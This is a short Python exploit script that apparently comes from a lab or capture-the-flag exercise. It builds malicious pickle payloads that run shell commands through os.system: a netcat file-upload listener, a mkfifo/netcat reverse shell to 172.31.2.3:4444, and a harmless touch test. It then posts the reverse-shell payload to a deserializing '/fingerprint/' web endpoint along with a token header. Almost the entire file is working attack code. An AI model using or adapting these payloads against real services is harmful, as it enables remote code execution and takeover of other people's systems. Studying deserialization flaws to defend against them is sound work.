import requests


# Use netcat to upload a file.
nc_upload_pickle = b"cos\nsystem\n(S'nc -nvlp 4444 > /tmp/newfile'\ntR."

# Use netcat to send a reverse shell.
nc_reverse_pickle = b"cos\nsystem\n(S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.31.2.3 4444 >/tmp/f'\ntR."

file_touch_pickle = b"cos\nsystem\n(S'touch f00bar'\ntR."

# Request config.
headers = {'content-type': 'application/json', 'Token': 'SSdtIFBpY2tsZSBSaWNrIQ=='}
url = 'http://172.31.2.105:8000/fingerprint/'

# Send the pickle to remote host.
requests.post(url, data=nc_reverse_pickle, headers=headers)
